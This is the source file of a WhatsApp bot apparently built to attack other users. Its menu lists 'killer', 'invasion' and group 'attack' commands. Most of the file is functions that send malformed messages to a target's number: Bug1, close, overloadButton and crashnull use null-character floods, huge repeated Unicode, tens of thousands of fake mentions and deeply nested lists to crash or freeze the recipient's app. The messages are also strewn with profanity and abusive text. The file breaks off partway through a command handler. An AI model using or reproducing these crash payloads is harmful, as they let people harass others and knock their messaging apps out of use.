
const myfunc = require('./lib/myfunc');
const lowdb = require('./lib2/lowdb');
const mongoDB = require('./lib2/mongoDB');
const myfunc2 = require('./lib2/myfunc');
const oke = require('./lib2/oke.js');
const rentbot = require('./rentbot');
const settings = require('./settings');
const spiderx = require('./spiderx');
const spiderxtele = require('./spiderxtele');
const Baileys = require('@adiwajshing/baileys');
const Boom = require('@hapi/boom');
const PhoneNumber = require('awesome-phonenumber');
const FileType = require('file-type');
const _ = require('lodash');
const Lowdb = require('lowdb');
const os = require('os');
const perfNow = require('performance-now');
const Pino = require('pino');
const readline = require('readline');
const SSH2 = require('ssh2');
const { Telegraf } = require('telegraf');
const yargs = require('yargs/yargs');

require('./setting/settings');
const fs = require('fs');
const axios = require('axios');
const path = require('path');
const crypto = require('crypto');
const chalk = require("chalk");
const util = require("util");

const moment = require("moment-timezone");
const { spawn, exec, execSync } = require('child_process');

const { default: baileys, proto, generateWAMessage, generateWAMessageFromContent, getContentType, prepareWAMessageMedia } = require("@whiskeysockets/baileys");

module.exports = vampire = async (vampire, m, chatUpdate, store) => {
try {
// Message type handling
const body = (
m.mtype === "conversation" ? m.message.conversation :
m.mtype === "imageMessage" ? m.message.imageMessage.caption :
m.mtype === "videoMessage" ? m.message.videoMessage.caption :
m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :
m.mtype === "templateButtonReplyMessage" ? m.msg.selectedId :
m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text : ""
);

const sender = m.key.fromMe
? vampire.user.id.split(":")[0] || vampire.user.id
: m.key.participant || m.key.remoteJid;

const senderNumber = sender.split('@')[0];
const budy = (typeof m.text === 'string' ? m.text : '');
const prefa = ["", "!", ".", ",", "🐤", "🗿"];
const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!™©®Δ^βα¦|/\\©^]/gi) : '.';
const from = m.key.remoteJid;
const isGroup = from.endsWith("@g.us");
const To = ["https://files.catbox.moe/wo5z4s.jpg","https://files.catbox.moe/9rik8l.jpg","https://files.catbox.moe/1ooktt.jpg","https://files.catbox.moe/sef391.jpg","https://files.catbox.moe/6boj1c.jpg"]
const ytta = To[Math.floor(Math.random() * To.length)]
const Kntl = ["https://files.catbox.moe/omcwbu.jpg"]
const C2 = Kntl[Math.floor(Math.random() * Kntl.length)]
const Tol = ["https://files.catbox.moe/w2et0e.io_1734959001528"]
const ytt = Tol[Math.floor(Math.random() * Tol.length)]
const tdxlol = fs.readFileSync('./virtex/tdx.jpeg')
const urpdf=
fs.readFileSync('./urpdf.jpg')      
// Database
const kontributor = JSON.parse(fs.readFileSync('./lib/database/murbug.json'));
const contacts = JSON.parse(fs.readFileSync('./lib/contacts.json'));
const kosong = fs.readFileSync("./lib/kosong.jpg")
const botNumber = await vampire.decodeJid(vampire.user.id);
const owner = JSON.parse(fs.readFileSync('./lib/database/owner.json'))
const isOwner = m.sender == owner+"@s.whatsapp.net" ? true : m.sender == botNumber ? true : false
const isBot = botNumber.includes(senderNumber)
const isAcces = [botNumber, ...kontributor, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const command = body.slice(1).trim().split(/ +/).shift().toLowerCase();
const args = body.trim().split(/ +/).slice(1);
const pushname = m.pushName || "No Name";
const text = q = args.join(" ");
const quoted = m.quoted ? m.quoted : m;
const mime = (quoted.msg || quoted).mimetype || '';
const qmsg = (quoted.msg || quoted);
const isMedia = /image|video|sticker|audio/.test(mime);
const kontol = m.key.fromMe ? vampire.user.id.split(':')[0x0] + '@s.whatsapp.net' || vampire.user.id : m.key.participant || m.key.remoteJid;

// Group function
const groupMetadata = isGroup ? await vampire.groupMetadata(m.chat).catch((e) => {}) : "";
const groupOwner = isGroup ? groupMetadata.owner : "";
const groupName = m.isGroup ? groupMetadata.subject : "";
const participants = isGroup ? await groupMetadata.participants : "";
const groupAdmins = isGroup ? await participants.filter((v) => v.admin !== null).map((v) => v.id) : "";
const groupMembers = isGroup ? groupMetadata.participants : "";
const isGroupAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
const isAdmins = isGroup ? groupAdmins.includes(m.sender) : false;

// Media
const Out = { 
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...(from ? {
remoteJid :"status@broadcast"
 }: {})},
 message:
 {"orderMessage":
 {"orderId":"174238614569438",
 "thumbnailUrl": kosong, //image 0kb
 "itemCount": 999999999,
 "status":
 "INQUIRY",
 "surface": "CATALOG",
 "message": `PAIN INVASION`,
 "token":"AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA==" }},
 contextInfo: {"mentionedJid":m.sender.split, "forwardingScore":999,"isForwarded":true}}
 
// Function
const { smsg, sendGmail, formatSize, isUrl, generateMessageTag, getBuffer, getSizeMedia, runtime, fetchJson, sleep } = require('./lib/myfunction');
const { ytdl } = require('./lib/scrape/scrape-ytdl')

// Time
const time = moment.tz("Asia/Jakarta").format("HH:mm:ss");

// Console log
if (m.message) {
console.log('\x1b[30m--------------------\x1b[0m');
console.log(chalk.bgHex("#e74c3c").bold(`▢ 𝗠𝗘𝗦𝗦𝗔𝗚𝗘 𝗙𝗥𝗢𝗠 𝙑𝙖𝙢𝙥𝙞𝙧𝙚 𝙍𝙚𝙫𝙤𝙡𝙪𝙩𝙞𝙤𝙣`));
console.log(
chalk.bgHex("#00FF00").black(
` ⌬ Time: ${new Date().toLocaleString()} \n` +
` ⌬ Message: ${m.body || m.mtype} \n` +
` ⌬ Sender: ${m.pushname} \n` +
` ⌬ Number: ${senderNumber}`
)
);
if (m.isGroup) {
console.log(
chalk.bgHex("#00FF00").black(
` ⌬ Grup: ${groupName} \n` +
` ⌬ GroupJid: ${m.chat}`
)
);
}
console.log();
}


/*BATAS COOLDOWN*/
const userCooldowns = {};
const cooldownTime = 5000; // Cooldown 5 detik
let isCooldownEnabled = false; // Flag untuk 
/*==============================*/
const qkontak = {
key: {
participant: `0@s.whatsapp.net`,
...(botNumber ? {
remoteJid: `status@broadcast`
} : {})
},
message: {
'contactMessage': {
'displayName': `PAIN INVVASION`,
'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;ttname,;;;\nFN:ttname\nitem1.TEL;waid=254756182478:+254756182478\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
sendEphemeral: true
}}
}


// QuotedBug
    const NullBug = {
      key: {
        remoteJid: "p",
        fromMe: false,
        participant: "0@s.whatsapp.net",
      },
      message: {
        interactiveResponseMessage: {
          body: {
            text: "Tennormodz",
            format: "DEFAULT",
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"devorsixcore@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0000".repeat(
              500000
            )}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
            version: 3,
          },
        },
      },
    };
const crypto = require('crypto');
    async function Bug1(target) {
  const stanza = [
    {
      attrs: { biz_bot: "1" },
      tag: "bot",
    },
    {
      attrs: {},
      tag: "biz",
    },
  ];

  let messagePayload = {
    viewOnceMessage: {
      message: {
        listResponseMessage: {
          title: "✦ Vampire" + "ꦽ".repeat(9740),
          listType: 2,
          singleSelectReply: {
            selectedRowId: "⚡",
          },
          contextInfo: {
            stanzaId: vampire.generateMessageTag(),
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            mentionedJid: [target, "13135550002@s.whatsapp.net"],
            quotedMessage: {
              buttonsMessage: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                  mimetype:
                    "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                  fileLength: "9999999999999",
                  pageCount: 3567587327,
                  mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                  fileName: "KONTOL LUH ANJING",
                  fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                  directPath:
                    "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1735456100",
                  contactVcard: true,
                  caption:
                    "sebuah kata maaf takkan membunuhmu, rasa takut bisa kau hadapi",
                },
                contentText: '༑ Fail Beta - ( devorsixcore ) "👋"',
                footerText: "© running since 2020 to 20##?",
                buttons: [
                  {
                    buttonId: "\u0000".repeat(900000),
                    buttonText: {
                      displayText: "𐎟 ✦  ̶̶̱̲̄͟͟͞͞.Vampire𐎟",
                    },
                    type: 1,
                  },
                ],
                headerType: 3,
              },
            },
            conversionSource: "porn",
            conversionData: crypto.randomBytes(16),
            conversionDelaySeconds: 9999,
            forwardingScore: 999999,
            isForwarded: true,
            quotedAd: {
              advertiserName: " x ",
              mediaType: "IMAGE",
              jpegThumbnail: "VQuoted",
              caption: " x ",
            },
            placeholderKey: {
              remoteJid: "0@s.whatsapp.net",
              fromMe: false,
              id: "ABCDEF1234567890",
            },
            expiration: -99999,
            ephemeralSettingTimestamp: Date.now(),
            ephemeralSharedSecret: crypto.randomBytes(16),
            entryPointConversionSource: "kontols",
            entryPointConversionApp: "kontols",
            actionLink: {
              url: "t.me/devor6core",
              buttonTitle: "konstol",
            },
            disappearingMode: {
              initiator: 1,
              trigger: 2,
              initiatorDeviceJid: target,
              initiatedByMe: true,
            },
            groupSubject: "kontol",
            parentGroupJid: "kontolll",
            trustBannerType: "kontol",
            trustBannerAction: 99999,
            isSampled: true,
            externalAdReply: {
              title: '! 𝖽𝖾𝗏𝗈𝗋𝗌𝖾𝗅𝗌 - "Supra MK4" 🩸',
              mediaType: 2,
              renderLargerThumbnail: false,
              showAdAttribution: false,
              containsAutoReply: false,
              body: "© running since 2020 to 20##?",
              thumbnail: "",
              sourceUrl: "go fuck yourself",
              sourceId: "dvx - problem",
              ctwaClid: "cta",
              ref: "ref",
              clickToWhatsappCall: true,
              automatedGreetingMessageShown: false,
              greetingMessageBody: "kontol",
              ctaPayload: "cta",
              disableNudge: true,
              originalImageUrl: "konstol",
            },
            featureEligibilities: {
              cannotBeReactedTo: true,
              cannotBeRanked: true,
              canRequestFeedback: true,
            },
            forwardedNewsletterMessageInfo: {
              newsletterJid: "120363274419384848@newsletter",
              serverMessageId: 1,
              newsletterName: `TrashDex 𖣂      - 〽${"ꥈꥈꥈꥈꥈꥈ".repeat(10)}`,
              contentType: 3,
              accessibilityText: "kontol",
            },
            statusAttributionType: 2,
            utm: {
              utmSource: "utm",
              utmCampaign: "utm2",
            },
          },
          description: "by : devorsixcore",
        },
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32),
          supportPayload: JSON.stringify({
            version: 2,
            is_ai_message: true,
            should_show_system_message: true,
            ticket_id: crypto.randomBytes(16),
          }),
        },
      },
    },
  };

  await vampire.relayMessage(target, messagePayload, {
    additionalNodes: stanza,
    
  });
}
async function close(target) {
	                const jids = `_*~@13135550002~*_\n`.repeat(3000);
	                const ui = 'ꦽ'.repeat(7777);
                    await vampire.relayMessage(target, {
                    ephemeralMessage: {
                    message: {
                    interactiveMessage: {
                    header: {
                    documentMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                    mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                    fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                    fileLength: "9999999999999",
                    pageCount: 1316134911,
                    mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                    fileName: "ᄃΛᄂIƧƬΛᄃЯΛƧΉ",
                    fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                    directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1726867151",
                    contactVcard: true,
                    jpegThumbnail: "",
                    },
                   hasMediaAttachment: true,
                    },

								    	body: { text: 'elu si anj gangu' + ui + jids },
								    	contextInfo: {
										mentionedJid: ['13135550002@s.whatsapp.net'],
										mentions: ['13135550002@s.whatsapp.net'],
										},
								       footer: { text: '' },
									   nativeFlowMessage: {},
                                       contextInfo: {
                                       mentionedJid: ["13135550002@s.whatsapp.net", ...Array.from({
                                       length: 30000
                                       }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
                                      forwardingScore: 1,
                                      isForwarded: true,
                                      fromMe: false,
                                      participant: "0@s.whatsapp.net",
                                      remoteJid: "status@broadcast",
                                      quotedMessage: {
                                      documentMessage: {
                                      url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                                      mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                                      fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                                      fileLength: "9999999999999",
                                      pageCount: 1316134911,
                                      mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                                      fileName: "DeMonic",
                                      fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                                      directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                                      mediaKeyTimestamp: "1724474503",
                                      contactVcard: true,
                                      thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                                      thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
           thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
           jpegThumbnail: "",
          },
         },
        },
       },
      },
     },
    },
    target ? {
     participant: {
      jid: target
     }
    } : {}
   );
	}     
async function overloadButton(Target) {
let sections = [];
for (let i = 0; i < 1999; i++) { // Sesuaikan jumlah section
let largeText = 'ྀི'.repeat(5999); // Pesan besar

let deepNested = {
title: `Section ${i + 1}`,
highlight_label: `Highlight ${i + 1}`,
rows: [{
title: largeText,
id: `id${i}`,
subrows: [
{
title: 'Nested row 1',
id: `nested_id1_${i}`,
subsubrows: [
{
title: 'Deep Nested row 1',
id: `deep_nested_id1_${i}`
},
{
title: 'Deep Nested row 2',
id: `deep_nested_id2_${i}`
}
]
},
{
title: 'Nested row 2',
id: `nested_id2_${i}`
}
]
}]
};

sections.push(deepNested);
}

let listMessage = {
title: "𝙾𝚅𝙴𝚁𝙻𝙾𝙰𝙳",
sections: sections
};

let msg = generateWAMessageFromContent(Target, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: {
mentionedJid: [Target],
isForwarded: true,
forwardingScore: 999
},
body: proto.Message.InteractiveMessage.Body.create({
text: "𝐙‌𝐗‌𝐎 ⿻‌𝐔𝐈⿻‌" + "ꦾ".repeat(89999)
}),
footer: proto.Message.InteractiveMessage.Footer.create({
buttonParamsJson: JSON.stringify(listMessage)
}),
header: proto.Message.InteractiveMessage.Header.create({
buttonParamsJson: JSON.stringify(listMessage),
subtitle: "𝐎𝐯𝐞𝐥𝐨𝐚𝐝‌" + "ྀི".repeat(4999), 
hasMediaAttachment: false
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
  buttons: [
{
name: "single_select",
buttonParamsJson: "JSON.stringify(listMessage)"
},
{
name: "payment_method",
buttonParamsJson: "{}"
},
{
name: "call_permission_request",
buttonParamsJson: "{}"
},
{
name: "single_select",
buttonParamsJson: "JSON.stringify(listMessage)"
},
{
name: "mpm",
buttonParamsJson: "JSON.stringify(listMessage)"
}, 
{
name: "mpm",
buttonParamsJson: "JSON.stringify(listMessage)"
}, 
{
name: "mpm",
buttonParamsJson: "JSON.stringify(listMessage)"
}, 
{
name: "mpm",
buttonParamsJson: "{}"
}, 
{
name: "mpm",
buttonParamsJson: "{}"
}, 
{
name: "mpm",
buttonParamsJson: "{}"
}, 
{
name: "mpm",
buttonParamsJson: "{}"
}

]
})
})
}
}
}, {});

await vampire.relayMessage(Target, msg.message, {
messageId: msg.key.id
});

console.log(`Succes Send FloodUi To ${Target}`);
}
              
	async function crashnull(target) {
  const stanza = [
    {
      attrs: { biz_bot: "1" },
      tag: "bot",
    },
    {
      attrs: {},
      tag: "biz",
    },
  ];

  let messagePayload = {
    viewOnceMessage: {
      message: {
        listResponseMessage: {
          title: "✦ Vampire" + "ꦽ".repeat(9740),
          listType: 2,
          singleSelectReply: {
            selectedRowId: "⚡",
          },
          contextInfo: {
            stanzaId: vampire.generateMessageTag(),
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            mentionedJid: [target, "13135550002@s.whatsapp.net"],
            quotedMessage: {
              buttonsMessage: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                  mimetype:
                    "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                  fileLength: "9999999999999",
                  pageCount: 3567587327,
                  mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                  fileName: "KONTOL LUH ANJING",
                  fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                  directPath:
                    "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1735456100",
                  contactVcard: true,
                  caption:
                    "sebuah kata maaf takkan membunuhmu, rasa takut bisa kau hadapi",
                },
                contentText: '༑ Fail Beta - ( devorsixcore ) "👋"',
                footerText: "© running since 2020 to 20##?",
                buttons: [
                  {
                    buttonId: "\u0000".repeat(900000),
                    buttonText: {
                      displayText: "𐎟 ✦  ̶̶̱̲̄͟͟͞͞.Vampire𐎟",
                    },
                    type: 1,
                  },
                ],
                headerType: 3,
              },
            },
            conversionSource: "porn",
            conversionData: crypto.randomBytes(16),
            conversionDelaySeconds: 9999,
            forwardingScore: 999999,
            isForwarded: true,
            quotedAd: {
              advertiserName: " x ",
              mediaType: "IMAGE",
              jpegThumbnail: "VQuoted",
              caption: " x ",
            },
            placeholderKey: {
              remoteJid: "0@s.whatsapp.net",
              fromMe: false,
              id: "ABCDEF1234567890",
            },
            expiration: -99999,
            ephemeralSettingTimestamp: Date.now(),
            ephemeralSharedSecret: crypto.randomBytes(16),
            entryPointConversionSource: "kontols",
            entryPointConversionApp: "kontols",
            actionLink: {
              url: "t.me/devor6core",
              buttonTitle: "konstol",
            },
            disappearingMode: {
              initiator: 1,
              trigger: 2,
              initiatorDeviceJid: target,
              initiatedByMe: true,
            },
            groupSubject: "kontol",
            parentGroupJid: "kontolll",
            trustBannerType: "kontol",
            trustBannerAction: 99999,
            isSampled: true,
            externalAdReply: {
              title: '! 𝖽𝖾𝗏𝗈𝗋𝗌𝖾𝗅𝗌 - "Supra MK4" 🩸',
              mediaType: 2,
              renderLargerThumbnail: false,
              showAdAttribution: false,
              containsAutoReply: false,
              body: "© running since 2020 to 20##?",
              thumbnail: "",
              sourceUrl: "go fuck yourself",
              sourceId: "dvx - problem",
              ctwaClid: "cta",
              ref: "ref",
              clickToWhatsappCall: true,
              automatedGreetingMessageShown: false,
              greetingMessageBody: "kontol",
              ctaPayload: "cta",
              disableNudge: true,
              originalImageUrl: "konstol",
            },
            featureEligibilities: {
              cannotBeReactedTo: true,
              cannotBeRanked: true,
              canRequestFeedback: true,
            },
            forwardedNewsletterMessageInfo: {
              newsletterJid: "120363274419384848@newsletter",
              serverMessageId: 1,
              newsletterName: `TrashDex 𖣂      - 〽${"ꥈꥈꥈꥈꥈꥈ".repeat(10)}`,
              contentType: 3,
              accessibilityText: "kontol",
            },
            statusAttributionType: 2,
            utm: {
              utmSource: "utm",
              utmCampaign: "utm2",
            },
          },
          description: "by : devorsixcore",
        },
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32),
          supportPayload: JSON.stringify({
            version: 2,
            is_ai_message: true,
            should_show_system_message: true,
            ticket_id: crypto.randomBytes(16),
          }),
        },
      },
    },
  };

  await vampire.relayMessage(target, messagePayload, {
    additionalNodes: stanza,
    participant: { jid: target },
  });
}							    	
                                       
      
                    

      
                
        
                        
                
                 
                
async function rebornnoclick(target) {
  try {
    let message = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
            contextInfo: {
              mentionedJid: [target],
              isForwarded: true,
              forwardingScore: 999,
              businessMessageForwardInfo: {
                businessOwnerJid: target,
              },
            },
            body: {
              text: "Killed By Vampire",
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
              ],
            },
          },
        },
      },
    };

    await vampire.relayMessage(target, message, {
      participant: { jid: target },
    });
  } catch (err) {
    console.log(err);
  }
}
    async function SendPairing(target, Ptcp = true) {
			await vampire.relayMessage(target, {
					viewOnceMessage: {
						message: {
								nativeFlowResponseMessage: {
									"status":true,
                           "criador":"VenomMods","resultado":"\n{\n\"type\":\"md\",\n\"ws\":{\n\"_events\":{\"CB:ib,,dirty\":[\"Array\"]},\n\"_eventsCount\":20,\n\"_maxListeners\":0,\n\"url\":\"wss://web.whatsapp.com/ws/chat\",\n\"config\":{\n\"version\":[\"Array\"],\n\"browser\":[\"Array\"],\n\"waWebSocketUrl\":\"wss://web.whatsapp.com/ws/chat\",\n\"connectTimeoutMs\":20000,\n\"keepAliveIntervalMs\":30000,\n\"logger\":{},\n\"printQRInTerminal\":false,\n\"emitOwnEvents\":true,\n\"defaultQueryTimeoutMs\":60000,\n\"customUploadHosts\":[],\n\"retryRequestDelayMs\":250,\n\"maxMsgRetryCount\":5,\n\"fireInitQueries\":true,\n\"auth\":{\"Object\":\"authData\"},\n\"markOnlineOnConnect\":true,\n\"syncFullHistory\":false,\n\"linkPreviewImageThumbnailWidth\":192,\n\"transactionOpts\":{\"Object\":\"transactionOptsData\"},\n\"generateHighQualityLinkPreview\":false,\n\"options\":{},\n\"appStateMacVerification\":{\"Object\":\"appStateMacData\"},\n\"mobile\":false\n}\n}\n}"
							}
						}
					}
				},
				Ptcp ? {
					participant: {
						jid: target
					}
				} : {}
			);
};
const jimp = require("jimp")
let resize = async (image, width, height) => {
    let oyy = await jimp.read(image)
    let kiyomasa = await oyy.resize(width, height).getBufferAsync(jimp.MIME_JPEG)
    return kiyomasa
}

vampire.ments = async (text) => {
    return [m.sender];
};

// Helper functions
const reply = bokep => {
      vampire.sendMessage(m.chat, {
        'text': bokep,
        'contextInfo': {
          'mentionedJid': [kontol],
          'forwardingScore': 0x98967f,
          'isForwarded': true,
          'externalAdReply': {
            'showAdAttribution': true,
            'containsAutoReply': true,
            'title': "𝗩𝗮𝗺𝗽𝗶𝗿𝗲 𝗜𝗻𝘃𝗮𝘀𝗶𝗼𝗻",
            'body': `𝗜𝗻𝗳𝗶𝗻𝗶𝘁𝗲 𝗖𝗿𝗮𝘀𝗵𝗲𝗿 𝗩𝗮𝗺𝗽𝗶𝗿𝗲`,
            'previewType': "PHOTO",
            'thumbnailUrl': `${ytta}`,
            'sourceUrl': 'https://whatsapp.com/channel/0029VafrbsKG8l5EFBDDCy41'
          }
        }
      }, {
        'quoted': qkontak
      });
    };

const reaction = async (jidss, emoji) => {
vampire.sendMessage(jidss, { react: { text: emoji, key: m.key }})}

// Command handler
switch (command) {
 case 'menu': {
const text12 = `
*Hai bro* @${m.sender.split("@")[0]}.. 

 *BOT INFORMATION*
 ▢ Creator : PAIN
 ▢ Bot Name : PAIN INVASSION 
 ▢ Version : 𝗜𝗻𝘃𝗮𝗻𝘀𝗶𝗼𝗻
 ▢ Baileys : 15.0.0
 ▢ Status: Creator
 
 𝗢𝗪𝗡𝗘𝗥 𝗙𝗘𝗔𝗧𝗨𝗥𝗘
 ⁂ ${prefix}addprem 254###
 ⁂ ${prefix}delprem 254###
 ⁂ ${prefix}self
 ⁂ ${prefix}public 

 𝗕𝗨𝗚 𝗙𝗘𝗔𝗧𝗨𝗥𝗘 (TARGET)
 ⁂ ${prefix}killer-V1 254###
 ⁂ ${prefix}killer-v2 254####
 ⁂ ${prefix}killer-v3 254####
 ⁂ ${prefix}killer-v4 254####
 ⁂ ${prefix}killer-v5 254####
 
 𝗕𝗨𝗚 𝗙𝗘𝗔𝗧𝗨𝗥𝗘 (DIRECT DM)
 ⁂ ${prefix}invasion-v1 
 ⁂ ${prefix}invasion-v2 
 ⁂ ${prefix}invasion-v3
 ⁂ ${prefix}bye and die

𝗕𝗨𝗚 𝗙𝗘𝗔𝗧𝗨𝗥𝗘 (GROUP)
⁂ ${prefix}attack-gc  link|jumlah
⁂ ${prefix}execute-gc link|jumlah

𝗧𝗢𝗢𝗟 𝗙𝗘𝗔𝗧𝗨𝗥𝗘
⁂ ${prefix}enc
⁂ ${prefix}Clearbugs 254####

𝗖𝗥𝗘𝗗𝗜𝗧 𝗦𝗖𝗥𝗜𝗣𝗧
⁂PAIN 𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿
⁂My God 𝗣𝗿𝗼𝘃𝗶𝗱𝗲𝗿
⁂All Friends 𝗦𝘂𝗽𝗽𝗼𝗿𝘁

©PAIN
`
         await vampire.sendMessage(m.chat, {  
            image: { url: "https://i.ibb.co/qMc53kSW/03ecbf4b8e3c18fc.jpg" },  
            caption: text12,   
            contextInfo: {
                mentionedJid: [m.sender],
                forwardedNewsletterMessageInfo: {
                    newsletterName: "PAIN INVASSION",
                    newsletterJid: `120363322464215140@newsletter` 
                },
                isForwarded: true,
               externalAdReply: {
                   showAdAttribution: true,
                   title: `𝗧𝗵𝗲 𝗜𝗻𝘃𝗮𝘀𝗶𝗼𝗻 𝗞𝗶𝗹𝗹𝗲𝗿`,
                   mediaType: 3,
                   renderLargerThumbnail: false,
                   thumbnailUrl: 'https://i.ibb.co/qMc53kSW/03ecbf4b8e3c18fc.jpg',
                   sourceUrl: `https://whatsapp.com/channel/0029VaxO2IADTkK5IMyoPJ0X`
                }
            }
        },{ quoted: qkontak }
     ),
       await vampire.sendMessage(m.chat, { 
           audio: { url: 'https://files.catbox.moe/wwmldn.mp3' },
           mimetype: 'audio/mp4', 
           ptt: true 
       },{ quoted: qkontak }
     );
}
 break;

  case "addprem":{
 const prem = JSON.parse(fs.readFileSync("./lib/database/murbug.json"))   
if (!isOwner) return reply('Only Owner!')
if (!args[0]) return reply(`Use ${prefix+command} number\nExample ${prefix+command} 254xxxx`)
